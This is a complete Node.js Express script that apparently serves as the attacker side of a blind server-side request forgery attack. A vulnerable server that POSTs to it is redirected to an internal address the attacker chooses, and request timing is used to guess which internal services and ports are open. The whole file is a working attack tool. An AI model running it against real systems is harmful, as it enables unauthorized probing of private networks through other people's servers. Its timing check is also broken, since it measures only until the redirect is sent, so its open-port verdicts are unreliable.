const express = require('express');
const crypto = require('crypto');

const app = express();
app.use(express.json());

/*
 Generate short request IDs so logs are readable
*/
function reqId() {
  return crypto.randomBytes(3).toString('hex');
}

/*
 MAIN SSRF ENDPOINT
 ------------------
 The REAL server POSTs here.
 You control the redirect target via query param.
*/
app.post('/api', (req, res) => {
  const id = reqId();
  const target = req.query.target;

  const start = Date.now();

  console.log('\n==============================');
  console.log('[ID]', id);
  console.log('[TIME]', new Date().toISOString());
  console.log('[FROM IP]', req.ip);
  console.log('[REDIRECT TARGET]', target);

  // Immediately redirect the REAL server
  res.redirect(302, target);

  // When the REAL server finishes its internal fetch
  res.on('finish', () => {
    const duration = Date.now() - start;

    console.log('[FINISHED]', id);
    console.log('[DURATION]', duration, 'ms');

    if (duration > 8000) {
      console.log('[RESULT] 🔥 Blind SSRF very likely (timeout behavior)');
    } else if (duration > 1500) {
      console.log('[RESULT] ⚠️ Possible internal port filtering');
    } else {
      console.log('[RESULT] ✅ Internal service reachable / open port');
    }
  });
});

/*
 Health check
*/
app.get('/', (_, res) => {
  res.send('SSRF test server running');
});

app.listen(8080, () => {
  console.log('Blind SSRF test server listening on port 8080');
});
